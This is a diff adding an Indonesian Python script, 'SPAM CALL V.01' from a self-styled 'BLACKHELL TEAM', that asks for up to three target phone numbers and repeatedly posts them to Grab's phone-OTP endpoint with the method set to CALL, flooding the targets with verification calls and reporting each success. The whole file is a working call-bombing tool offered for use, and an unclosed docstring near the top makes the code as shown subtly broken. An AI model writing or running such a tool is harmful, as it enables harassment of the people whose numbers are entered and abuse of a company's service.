@@ -1,0 +1,64 @@
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+# Coded by HIZKANATIC
+"""
+
+try:
+	import os, requests, time
+except ModuleNotFoundError:
+	print("\nSepertinya module requests BELUM Di Install")
+	print("$ pip install requests\n")
+	exit()
+
+os.system('clear')
+c=('\033[1;36m')
+r=('\033[1;31m')
+g=('\033[1;32m')
+w=('\033[1;37m')
+print("""%s
+			SPAM CALL V.01%s
+ ,_     _‚
+ |\\\___//|	%sAuthor: HIZKANATIC%s
+ |=6   6=|	%sContact: https://instagram.com/hizqilhkm%s
+ \=._Y_.=/	%sGithub: https://github.com/hizkanatic%s
+  )  `  (    ,	%sTEAM   : BLACKHELL TEAM%s
+ /       \  ((
+ |       |   ))
+/| |   | |\_//	%sMASUKAN NOMOR DENGAN "62" (EX: 628XXXXXX)%s
+\| |._.| |/-’
+ '"'   '"'
+<NOTE> Jika terjadi ERROR atau BUG dan lain-lain, silahkan hubungi saya >_<"""%(c,r,g,r,g,r,g,r,g,r,w,r))
+print("%s[*] Klik ENTER untuk melewati step%s"%(g,g))
+no1 = input("[?] NO TARGET 1 => %s"%(w))
+no2 = input("%s[?] NO TARGET 2 => %s"%(g,w))
+no3 = input("%s[?] NO TARGET 3 => %s"%(g,w))
+jlmh=int(input("%s[?] JUMLAH SPAM => %s"%(g,w)))
+dt1={'method':'CALL','countryCode':'id','phoneNumber':no1,'templateID':'pax_android_production'}
+dt2={'method':'CALL','countryCode':'id','phoneNumber':no2,'templateID':'pax_android_production'}
+dt3={'method':'CALL','countryCode':'id','phoneNumber':no3,'templateID':'pax_android_production'}
+
+try:
+	print()
+	print("%s[-] RESULT:%s"%(r,w))
+	for i in range(jlmh):
+		print("[!] Tunggu Sayang :)")
+		idk=("challengeID")
+		r1 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt1)
+		r2 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt2)
+		r3 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt3)
+		if str(idk) in str(r1.text):
+			print("[+] TARGET1 MAMPOOS")
+		else:
+			print("[-] TARGET1 GAGAL")
+		if str(idk) in str(r2.text):
+			print("[+] TARGET2 MAMPOOS")
+		else:
+			print("[-] TARGET2 GAGAL")
+		if str(idk) in str(r3.text):
+			print("[+] TARGET3 MAMPOOS")
+		else:
+			print("[-] TARGET3 GAGAL")
+		print("="*30)
+		time.sleep(1)
+except KeyboardInterrupt:
+	print("%sampai jumpa sayang..."%(c))
